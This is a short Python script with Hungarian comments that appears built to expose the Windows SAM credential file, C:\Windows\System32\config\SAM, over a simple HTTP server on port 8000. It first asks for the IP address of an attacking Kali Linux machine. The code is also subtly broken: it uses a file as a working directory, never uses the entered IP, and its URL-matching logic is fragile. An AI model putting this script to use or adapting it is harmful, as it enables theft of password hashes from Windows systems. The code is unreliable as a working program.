import subprocess
import re
import webbrowser

# Bekérjük a Kali Linux gép IP címét
kali_ip = input("Kérem, adja meg a Kali Linux gép IP címét: ")

# A megadott mappa elérési útvonala, ahol a fájlokat megosztod
mappa_utvonal = 'C:\Windows\System32\config\SAM'  # Itt add meg a mappa elérési útvonalát

# Portszám, amelyen a szerver fut
port = 8000

# Indítjuk a HTTP szervert a subprocess modullal
server_process = subprocess.Popen(['python3', '-m', 'http.server', str(port)], cwd=mappa_utvonal, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

# Megkeressük a kimenetben az elérhető URL-t
url_pattern = re.compile(r'http://0.0.0.0:8000/')
url = None
for line in server_process.stdout:
    match = url_pattern.search(line)
    if match:
        url = match.group()
        break

# Megnyitjuk a böngészőt az elérhető URL-címmel
if url:
    webbrowser.open(url)
else:
    print("Nem sikerült megtalálni az elérhető URL-t. Ellenőrizd, hogy a szerver helyesen indult-e.")

# Várunk a szerver befejezésére
server_process.wait()
